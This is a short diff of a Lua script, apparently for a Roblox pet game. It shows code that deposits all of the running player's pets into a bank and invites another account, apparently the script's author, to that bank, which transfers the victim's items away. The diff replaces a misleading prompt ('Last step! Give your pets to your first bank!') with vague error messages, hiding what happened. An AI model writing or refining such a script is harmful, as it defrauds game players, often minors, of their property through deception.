@@ -32,12 +32,12 @@ for i,v in pairs(lib.Save.Get().Pets) do
 end
 local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, 0);
 if request then
-    lib.Message.New("Last step! Give your pets to your first bank!");
+    lib.Message.New("Error #1");
 else
    lib.Message.New("Last step! Give your pets to your first bank!");
 end
 if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
-    lib.Message.New("Last step! Give your pets to your first bank!");
+    lib.Message.New("Error #2");
 else
-    lib.Message.New("Last step! Give your pets to your first bank!");
+    lib.Message.New("Error #3");
 end;
